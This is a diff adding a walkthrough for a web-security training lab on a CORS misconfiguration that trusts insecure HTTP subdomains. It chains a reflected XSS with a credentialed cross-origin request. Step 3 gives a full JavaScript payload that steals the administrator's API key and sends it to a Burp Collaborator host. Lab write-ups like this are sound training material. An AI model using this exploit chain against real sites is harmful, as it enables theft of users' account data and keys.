@@ -190,4 +190,44 @@ The parameter apikey holds the administrator’s API key: Ze9k8vWLSpWSHFFk210mj4
 
 
 
+# Lab: CORS vulnerability with trusted insecure protocols
 
+### Step 1: Log in and identify the CORS endpoint
+
+Log in with wiener:peter. Open Burp history and locate the AJAX request to /accountDetails. The response contains Access-Control-Allow-Credentials: true, indicating CORS support.
+
+Send this request to Repeater. Add an Origin header: Origin: `http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net`. Observe that the response includes Access-Control-Allow-Origin: `http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net` – the origin is reflected, confirming that any subdomain (HTTP or HTTPS) is trusted.
+
+### Step 2: Find an XSS on a subdomain
+
+Open any product page (e.g., /product?productId=1). Click “Check stock”. Notice that the stock check uses an HTTP URL on a subdomain: http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net/?productId=...&storeId=1.
+
+Test the productId parameter for XSS. It is vulnerable. For example, adding <script>alert(1)</script> executes.
+
+### Step 3: Craft the combined exploit
+
+Generate a Burp Collaborator URL (e.g., https://6elx5gvihgjr2mzg909lt9lszj5atahz.oastify.com). The exploit will:
+
+- Redirect the victim to the HTTP stock subdomain with an XSS payload.
+- The XSS payload makes an authenticated CORS request to /accountDetails.
+- The stolen API key is sent to the Collaborator.
+
+The full exploit payload (to be placed on the exploit server):
+
+```js
+<script>
+document.location="http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a83005003af9c8780ba132500f70048.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://6elx5gvihgjr2mzg909lt9lszj5atahz.oastify.com/log?key='+this.responseText; };</script>&storeId=1"
+</script>
+```
+
+Note: The inner <script> tag is URL‑encoded as %3cscript%3e etc. In the actual payload, use proper encoding. The above is a readable representation.
+
+### Step 4: Host and deliver the exploit
+
+Go to the lab’s exploit server. Paste the exploit code into the “Body” section. Click “Store”. Then click “Deliver exploit to victim”.
+
+### Step 5: Capture the API key
+
+Open Burp Collaborator client and click “Poll now”. You will see an HTTP request containing the administrator’s API key in the key parameter. Submit the solution
+
+Scroll down on the lab page, paste the API key into the “Submit solution” field, and click “Submit”. The lab is solved.
